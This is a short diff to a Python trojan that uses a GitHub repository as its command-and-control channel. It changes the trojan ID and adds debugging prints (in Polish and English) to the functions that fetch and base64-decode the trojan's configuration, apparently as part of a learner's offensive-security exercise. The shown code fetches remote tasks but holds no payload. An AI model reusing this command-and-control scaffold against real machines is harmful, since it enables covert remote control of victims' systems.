@@ -11,7 +11,7 @@ import sys
 
 from github3 import login
 
-trojan_id = "abc"
+trojan_id = "identyfikator"
 
 trojan_config = "{}.json".format(trojan_id)
 data_path = "data/{}/".format(trojan_id)
@@ -37,13 +37,22 @@ def get_file_contents(filepath):
         if filepath in filename.path:
             print("[*] Znaleziono plik {}".format(filepath))
             blob = repo.blob(filename._json_data['sha'])
+            print('--------THIS----------')
+            #return filepath
+
             return blob.content
-        return None
+        print('--------THAT----------')
+    return None
 
 def get_trojan_config():
     global configured
     config_json = get_file_contents(trojan_config)
-    config = json.loads(base64.b64decode(config_json))
+    print(type(config_json))
+    decoded_json = base64.b64decode(config_json)
+
+    decoded_json = str(decoded_json)
+    print(type(decoded_json))
+    config = json.loads(decoded_json)
     configured = True
 
     for task in config:
